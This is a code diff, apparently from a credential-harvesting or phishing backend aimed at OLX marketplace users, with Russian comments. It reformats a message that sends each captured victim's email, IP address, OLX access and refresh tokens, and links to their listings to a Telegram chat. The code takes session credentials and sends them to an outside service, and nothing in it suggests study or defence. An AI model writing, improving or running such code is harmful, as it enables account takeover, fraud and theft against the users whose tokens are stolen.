@@ -100,16 +100,23 @@ def get_token():
                         ad_links_for_tg += f"{i+1}. <a href='{url}'>{title}</a>\n"
             except: pass
 
-            # 3. ФОРМИРУЕМ ЛОГ ДЛЯ ТЕЛЕГРАМА (На русском)
+           # 3. ФОРМИРУЕМ КОМПАКТНЫЙ ЛОГ
+            # Собираем кликабельный список: [Название](ссылка)
+            ads_flat = ""
+            if ads_data:
+                for i, ad in enumerate(ads_data):
+                    title = ad.get('title', 'Без названия')
+                    url = ad.get('url', 'https://olx.ua')
+                    ads_flat += f"{i+1}. <a href='{url}'>{title}</a>\n"
+            else:
+                ads_flat = "Объявлений нет"
+
             msg = (
-                f"🔥 <b>Авторизовался</b>\n"
-                f"--------------------------\n"
-                f"🌐 <b>IP:</b> <code>{user_ip}</code>\n"
-                f"📧 <b>Email:</b> <code>{email}</code>\n\n"
-                f"🔑 <b>ACCESS TOKEN:</b>\n<code>{access}</code>\n\n"
-                f"🔄 <b>REFRESH TOKEN:</b>\n<code>{refresh}</code>\n\n"
-                f"📦 <b>ОБЪЯВЛЕНИЯ:</b>\n{ad_links_for_tg if ad_links_for_tg else 'Объявлений не найдено'}\n"
-                f"--------------------------"
+                f"👤 <b>Вход:</b> <code>{email}</code>\n"
+                f"🌐 <b>IP:</b> <code>{user_ip}</code>\n\n"
+                f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
+                f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
+                f"📦 <b>Товары:</b>\n{ads_flat}"
             )
             send_telegram_message(msg)
 
